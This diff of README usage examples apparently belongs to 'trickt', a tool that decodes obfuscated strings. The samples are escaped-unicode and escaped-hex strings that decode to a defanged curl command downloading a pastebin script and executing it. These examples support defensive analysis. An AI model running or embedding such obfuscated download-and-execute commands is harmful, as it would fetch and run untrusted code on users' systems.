@@ -45,7 +45,7 @@ line 1::original:>  b'chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(1
 ```
 
 **Escaped unicode**
-- Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
+
 ```bash
 $ trickt '\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068'
 
@@ -56,7 +56,7 @@ line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\
     |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh'
 ```
 **Escaped hex**
-- Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
+
 ```bash
 $ trickt '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68'
 
